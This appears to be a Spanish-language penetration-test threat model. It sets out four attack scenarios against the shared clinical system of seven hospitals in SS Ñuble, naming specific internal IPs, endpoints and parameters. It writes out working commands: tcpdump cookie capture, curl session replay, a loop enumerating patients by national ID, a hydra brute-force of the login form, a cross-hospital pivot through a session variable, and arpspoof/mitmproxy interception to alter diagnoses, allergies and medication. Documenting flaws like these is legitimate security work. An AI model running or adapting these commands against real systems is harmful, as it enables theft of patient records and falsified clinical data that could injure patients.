# Escenarios de Ataque Compuestos

## Escenario A: Compromiso del segmento de red — exfiltración total

**Actor:** atacante con acceso al segmento `100.77.30.0/24` (empleado malicioso, contratista, dispositivo IoT comprometido, malware en estación de trabajo)

**Fase 1 — Captura pasiva**
```
tcpdump -i any -w hsc.pcap '(port 8080 or port 8084 or port 8085)'
```
→ PHPSESSID de SGH, DAU, LIS capturados en texto claro
→ AccessToken del ESB capturado en el HTML del SGH
→ TokenSesion del ESB capturado en query strings

**Fase 2 — Acceso con sesiones capturadas**
```
curl -b "PHPSESSID=<sgh_cookie>" "http://100.77.30.26:8085/SGH/.../listado_datos_camas_pacientes.php?..."
```
→ Censo completo de pacientes hospitalizados (7 hospitales)

```
for rut in $(seq 8000000 27000000); do
  curl -b "PHPSESSID=<sgh_cookie>" "http://.../obt_paciente.php?rut=$rut&v=X"
done
```
→ Enumeración de todos los pacientes con ficha en el hospital

**Fase 3 — Exfiltración**
→ Fichas clínicas completas de cada paciente encontrado
→ Todos los PDFs de epicrisis, ingresos, recetas (iterando ingreso_id)
→ Resultados de laboratorio de cada RUT del censo

**Resultado:** base de datos clínica completa del SS Ñuble. Tiempo: horas.
Detección: ninguna (el tráfico es indistinguible del uso legítimo).

---

## Escenario B: Credenciales débiles — acceso remoto sin red local

**Actor:** atacante externo con acceso al proxy `100.77.30.26` (expuesto a internet o accesible vía VPN comprometida)

**Fase 1 — Fuerza bruta**
```
hydra -l root -P rockyou.txt 100.77.30.26 http-post-form \
  "/SGH/funciones/autenticacion.php:usuario=^USER^&contrasena=^PASS^:id=login_form"
```
→ La detección de fallo es `id=login_form` en el body (no HTTP 401)
→ Sin rate limiting, sin lockout, sin CAPTCHA

**Fase 2 — Pivoteo cross-hospital**
```
curl -b "PHPSESSID=<sgh_cookie>" \
  -d "hh=2" "http://100.77.30.26:8085/SGH/vistas/cambiar_hospital.php"
```
→ Acceso a San Carlos aunque las credenciales sean de Coelemu

**Resultado:** acceso remoto completo sin presencia física en la red.

---

## Escenario C: Pivoteo desde hospital pequeño

**Actor:** atacante que compromete el hospital más débil de la red

**Premisa:** los 7 hospitales comparten la misma instancia SGH. El control de acceso
entre hospitales es una variable de sesión PHP (`$_SESSION['hospital_id']`), no
segregación real.

**Fase 1 — Comprometer Coelemu (ID=4)**
→ Hospital pequeño, menos recursos de seguridad, credenciales potencialmente más débiles

**Fase 2 — Cambiar a San Carlos (ID=2)**
```
POST vistas/cambiar_hospital.php  hh=2
```
→ Misma PHPSESSID, diferente hospital_id en sesión

**Fase 3 — Acceso completo a San Carlos**
→ Datos de pacientes del hospital principal con credenciales del más débil

**Resultado:** un atacante no necesita comprometer San Carlos directamente. El eslabón
más débil de los 7 hospitales abre toda la red.

---

## Escenario D: MITM contra ESB — inyección de datos clínicos falsos

**Actor:** atacante en posición MITM entre el proxy y `esb.saludenred.cl`

**Premisa:** `InsecureSkipVerify: true` → cualquier certificado es aceptado.

**Fase 1 — Intercepción**
```
arpspoof -i eth0 -t 100.77.30.26 <gateway>
mitmproxy --ssl-insecure -p 8443
```
→ Tráfico HTTPS entre proxy y ESB pasa por el atacante

**Fase 2 — Modificación de respuestas**
→ Interceptar respuesta de `:8099` (detalle secundaria)
→ Modificar `XMLDetalleHistoria.DetalleEpisodio`:
  - Cambiar diagnósticos CIE-10
  - Eliminar alergias documentadas
  - Modificar medicación (dosis, frecuencia)
  - Alterar epicrisis de alta (recomendaciones post-alta)

**Fase 3 — Reinyección**
→ El visor clínico recibe y muestra los datos modificados
→ El clínico toma decisiones basadas en información adulterada

**Resultado:** daño clínico directo a pacientes. Diagnósticos erróneos, medicación
incorrecta, altas prematuras.
